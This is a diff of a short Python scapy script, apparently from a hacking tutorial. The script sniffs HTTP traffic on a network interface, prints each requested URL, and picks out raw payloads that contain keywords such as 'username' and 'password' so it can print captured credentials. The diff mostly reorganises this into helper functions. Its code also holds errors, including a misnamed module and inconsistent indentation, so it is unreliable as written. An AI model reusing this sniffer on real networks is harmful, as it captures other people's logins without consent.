@@ -3,22 +3,34 @@ import scapy.all as scapy
 from scapy.layers import http
 
 def sniff(interface):
-	scapy.sniff(iface=interface, store=False, prn=cb)
+  scapy.sniff(iface=interface, store=False, prn=cb)
 
-def cb(packet):
-  if packet.haslayer(http.HTTPRequest):
-    url = packet[html.HTTPRequest].Host + packet[http.HTTPRequest].Path
-    print(url)
+
+def get_url(packet):
+	return packet[html.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
       load = packet[scapy.Raw].load
       keywords = ["username", "user", "login", "password", "pass"]
       for keyword in keywords:
         if keyword in load:
-        print(load)
-        break
+          return load
+
+def cb(packet):
+  if packet.haslayer(http.HTTPRequest):
+    url = get_url(packet)
+    print("[+] HTTP Request >> " + url)
+    login_info = get_login_info(packet)
+    if login_info:
+      print("\n\n[+] Possible user/pass > " + login_info + "\n\n")
+
+      
 
 #choose your interface
 sniff("eth0")
 	
+
+
   
 #Vernieri  
